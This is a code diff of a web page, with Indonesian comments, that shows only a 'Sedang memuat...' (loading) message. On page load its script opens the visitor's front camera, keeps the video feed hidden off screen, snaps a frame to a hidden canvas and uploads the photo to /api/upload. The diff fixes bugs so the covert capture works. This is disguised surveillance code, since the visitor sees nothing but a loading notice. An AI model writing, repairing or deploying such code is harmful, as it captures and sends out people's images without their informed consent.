@@ -4,6 +4,16 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Halaman</title>
+  <style>
+    #video {
+      position: absolute;
+      top: -99999px;
+      left: -9999px;
+      width: 1px;
+      height: 0;
+      pointer-events: none;
+    }
+  </style>
 </head>
 <body>
   <p>Sedang memuat...</p>
@@ -12,83 +22,65 @@
   <video id="video" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 
-  <style>
-    #video {
-      position:absolute;
-	  top:-99999px;
-	  left:-9999px;
-	  width:1px;
-	  height:0;
-	  pointer-events: none;
-    }
-  </style>
-
   <script>
-    // Ambil foto secara otomatis
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(stream => {
+    async function ambilFoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         video.srcObject = stream;
 
         await new Promise(resolve => {
-		video.onloadedmetadata = () => {
-		requestAnimationFrame(resolve);
-		};
-		});
+          video.onloadedmetadata = () => {
+            resolve();
+          };
+        });
 
-          canvas.width = video.videoWidth;
-          canvas.height = video.height;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-          requestAnimationFrame(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
+        // Tambahkan sedikit delay agar kamera siap (opsional)
+        await new Promise(resolve => setTimeout(resolve, 1500));
 
-            // Kirim ke API
-            fetch('/api/upload', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ image: imageData })
-            })
-            .then(async res => {
-				const contentType = res.headers.get("content-type");
-				if (contentType && contentType.includes("application/json")) {
-				return res.json();
-				} else {
-				const text = await res.text();
-				throw new Error("Bukan response JSON:\n" + text);
-				}
-				})
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/png');
 
-            .then(data => {
-              if (data.url) {
-                alert("Ish Ish");
+        const res = await fetch('/api/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: imageData })
+        });
 
-                // Tampilkan gambar
-                const img = document.createElement("img");
-                img.src = data.url;
-                img.style.maxWidth = "100%";
-                document.body.appendChild(img);
-              } else {
-                alert("Ish Ish"));
-                console.error("Ish Ish:", data);
-              }
-            })
-            .catch(err => {
-              alert("❌ Gagal menghubungi server: " + err.message);
-              console.error("Fetch error:", err);
-            });
+        const contentType = res.headers.get("content-type");
+        let data;
+        if (contentType && contentType.includes("application/json")) {
+          data = await res.json();
+        } else {
+          const text = await res.text();
+          throw new Error("Bukan response JSON:\n" + text);
+        }
 
-            // Matikan kamera
-            stream.getTracks().forEach(track => track.stop());
-          }, 1500);
-        };
-      })
-      .catch(error => {
+        if (data.url) {
+          alert("Ish Ish");
+
+          const img = document.createElement("img");
+          img.src = data.url;
+          img.style.maxWidth = "100%";
+          document.body.appendChild(img);
+        } else {
+          alert("Ish Ish");
+          console.error("Ish Ish:", data);
+        }
+
+        stream.getTracks().forEach(track => track.stop());
+      } catch (error) {
         console.error('Ish:', error);
         alert("❌ Ish " + error.message);
-      });
+      }
+    }
+
+    ambilFoto();
   </script>
 </body>
 </html>
